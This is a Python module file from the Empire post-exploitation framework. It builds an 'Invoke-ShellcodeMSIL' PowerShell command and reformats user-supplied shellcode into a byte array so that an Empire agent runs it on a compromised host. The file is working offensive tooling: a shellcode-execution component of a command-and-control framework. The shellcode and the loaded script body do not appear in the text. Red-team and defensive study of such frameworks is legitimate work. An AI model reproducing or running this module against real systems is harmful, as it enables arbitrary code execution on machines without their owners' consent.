from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source

class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        script_end = "Invoke-ShellcodeMSIL"

        for option, values in params.items():
            if (
                option.lower() != "agent"
                and values
                and values != ""
                and option.lower() == "shellcode"
            ):
                # transform the shellcode to the correct format
                sc = ",0".join(values.split("\\"))[1:]
                script_end += " -" + str(option) + " @(" + sc + ")"

        return script, script_end
